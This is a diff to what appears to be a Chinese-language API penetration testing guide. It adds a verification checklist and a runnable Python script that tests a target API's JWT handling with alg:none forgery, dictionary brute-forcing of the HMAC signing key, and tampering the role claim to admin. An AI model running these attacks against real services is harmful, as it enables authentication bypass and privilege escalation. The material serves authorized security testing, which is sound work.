@@ -62,6 +62,108 @@ spec 变更自动重跑、按严重度阈值阻断构建、发现持久化为回
 
 ## 三、验证
 
-- 每个漏洞给出可复现 PoC（请求/响应）
-- 授权漏洞用双会话对比确认
+- [ ] 每个漏洞给出可复现 PoC（请求/响应完整，他人可照此复现）
+- [ ] 授权漏洞用双会话对比确认（低权限会话与高权限会话对同一资源访问，响应差异明确）
+- [ ] JWT 攻击每个变体有测试记录（alg:none/密钥混淆/弱 HMAC/声明篡改/kid 注入，每项有结果）
+- [ ] GraphQL 内省/DoS 有测试证据（内省查询、别名过载、批查询，每项有响应记录）
+- [ ] 限速绕过用多 IP 验证（不同 IP 轮换后限速未生效，有请求日志佐证）
+- [ ] 漏洞影响面说明完整（每个漏洞标注影响范围、严重度、修复建议）
+
+## 三·五、代码骨架：JWT 攻击测试脚本
+
+> 可运行的 Python 骨架，对目标 API 执行 JWT 攻击变体测试。关键端点/密钥按样本替换。
+
+```python
+# jwt_attack_test.py — JWT 攻击测试骨架（Python）
+# 对目标 API 执行 JWT 攻击变体，记录每项结果
+
+import requests
+import json
+import base64
+import hashlib
+import hmac
+
+TARGET_URL = "[API_URL]"
+# 占位：从样本获取的合法 JWT
+LEGIT_JWT = "[LEGIT_JWT]"
+
+def b64url_decode(s):
+    """Base64URL 解码"""
+    s = s.replace("-", "+").replace("_", "/")
+    return base64.b64decode(s + "=" * (-len(s) % 4))
+
+def b64url_encode(data):
+    """Base64URL 编码"""
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+def test_alg_none(jwt):
+    """alg:none 攻击：头部改 none，清空签名"""
+    parts = jwt.split(".")
+    header = json.loads(b64url_decode(parts[0]))
+    payload = b64url_decode(parts[1])
+    header["alg"] = "none"
+    new_header = b64url_encode(json.dumps(header).encode())
+    new_jwt = f"{new_header}.{parts[1]}."
+    resp = requests.get(TARGET_URL, headers={"Authorization": f"Bearer {new_jwt}"})
+    return resp.status_code == 200, new_jwt, resp.status_code
+
+def test_weak_hmac(jwt, wordlist):
+    """弱 HMAC 爆破：用字典爆破签名密钥"""
+    parts = jwt.split(".")
+    header = b64url_decode(parts[0])
+    signing_input = f"{parts[0]}.{parts[1]}".encode()
+    signature = b64url_decode(parts[2])
+
+    for word in wordlist:
+        key = word.encode()
+        calc = hmac.new(key, signing_input, hashlib.sha256).digest()
+        if calc == signature:
+            return True, word, "HMAC key found"
+    return False, None, "no key in wordlist"
+
+def test_claim_tampering(jwt):
+    """声明篡改：修改 exp/role 等声明"""
+    parts = jwt.split(".")
+    payload = json.loads(b64url_decode(parts[1]))
+    payload["role"] = "admin"
+    payload["exp"] = 9999999999
+    new_payload = b64url_encode(json.dumps(payload).encode())
+    # 签名不变（若服务端未校验签名则可能通过）
+    new_jwt = f"{parts[0]}.{new_payload}.{parts[2]}"
+    resp = requests.get(TARGET_URL, headers={"Authorization": f"Bearer {new_jwt}"})
+    return resp.status_code == 200, new_jwt, resp.status_code
+
+def main():
+    print("=== JWT 攻击测试 ===")
+    results = []
+
+    # 1. alg:none
+    ok, jwt, code = test_alg_none(LEGIT_JWT)
+    print(f"[1] alg:none: {'VULNERABLE' if ok else 'SAFE'} (status={code})")
+    results.append(("alg:none", ok))
+
+    # 2. 弱 HMAC（需字典）
+    wordlist_path = "[WORDLIST_PATH]"
+    with open(wordlist_path) as f:
+        wordlist = f.read().splitlines()
+    ok, key, msg = test_weak_hmac(LEGIT_JWT, wordlist)
+    print(f"[2] weak_hmac: {'VULNERABLE' if ok else 'SAFE'} ({msg})")
+    results.append(("weak_hmac", ok))
+
+    # 3. 声明篡改
+    ok, jwt, code = test_claim_tampering(LEGIT_JWT)
+    print(f"[3] claim_tampering: {'VULNERABLE' if ok else 'SAFE'} (status={code})")
+    results.append(("claim_tampering", ok))
+
+    vuln = sum(1 for _, ok in results if ok)
+    print(f"\n=== 汇总 ===")
+    print(f"可利用变体: {vuln}/{len(results)}")
+
+if __name__ == "__main__":
+    main()
+```
+
+运行：`pip install requests && python3 jwt_attack_test.py`。验证：每项攻击测试结果明确，可利用变体数量汇总，PoC 可复现。
+
+> 更新：2026-11-17 · 来源：骨架为通用模板，配合 §二 认证测试使用
 - 限速绕过用多 IP 验证
